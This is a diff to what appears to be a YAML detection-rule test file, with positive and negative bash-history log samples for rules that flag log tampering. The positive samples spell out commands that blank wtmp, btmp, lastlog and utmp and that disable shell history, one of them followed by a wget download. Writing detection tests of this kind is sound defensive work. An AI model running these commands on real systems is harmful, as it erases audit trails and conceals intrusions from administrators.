@@ -307,12 +307,12 @@
   examples:
     positive:
       - 'Nov 20 15:03:00 web01 bash[959]: HISTORY: cat /dev/null > /var/log/wtmp; > /var/log/lastlog'
-      - 'Nov 21 09:00:37 host01 bash[4100]: HISTORY: >/var/log/wtmp'
-      - 'Nov 21 09:00:38 host01 bash[4100]: HISTORY: > /var/log/btmp'
-      - 'Nov 21 09:00:39 host01 bash[4100]: HISTORY: >/var/log/btmp'
-      - 'Nov 21 09:00:40 host01 bash[4100]: HISTORY: >/var/log/lastlog'
-      - 'Nov 21 09:00:41 host01 bash[4100]: HISTORY: > /var/run/utmp'
-      - 'Nov 21 09:00:42 host01 bash[4100]: HISTORY: >/var/run/utmp'
+      - 'Nov 21 09:00:08 web01 bash[4100]: HISTORY: cat /dev/null >/var/log/wtmp'
+      - 'Nov 21 09:00:09 web01 bash[4100]: HISTORY: cat /dev/null > /var/log/btmp'
+      - 'Nov 21 09:00:10 web01 bash[4100]: HISTORY: cat /dev/null >/var/log/btmp'
+      - 'Nov 21 09:00:11 web01 bash[4100]: HISTORY: cat /dev/null >/var/log/lastlog'
+      - 'Nov 21 09:00:12 web01 bash[4100]: HISTORY: cat /dev/null > /var/run/utmp'
+      - 'Nov 21 09:00:13 web01 bash[4100]: HISTORY: cat /dev/null >/var/run/utmp'
     negative:
       - 'Nov 20 15:03:01 web01 bash[960]: HISTORY: last -f /var/log/wtmp | head'
       - 'Nov 20 15:03:02 web01 bash[961]: HISTORY: lastlog -u alice'
@@ -361,7 +361,7 @@
     positive:
       - 'Nov 20 15:05:00 web01 bash[965]: HISTORY: export HISTFILE=/dev/null'
       - 'Nov 20 15:05:01 web01 bash[966]: HISTORY: set +o history; wget http://203.0.113.7/a'
-      - 'Nov 21 09:00:43 host01 bash[4100]: HISTORY: HISTSIZE=0'
+      - 'Nov 21 09:00:14 web01 bash[4100]: HISTORY: export HISTSIZE=0'
     negative:
       - 'Nov 20 15:05:02 web01 bash[967]: HISTORY: export HISTSIZE=10000'
       - 'Nov 20 15:05:03 web01 bash[968]: HISTORY: set -o vi'
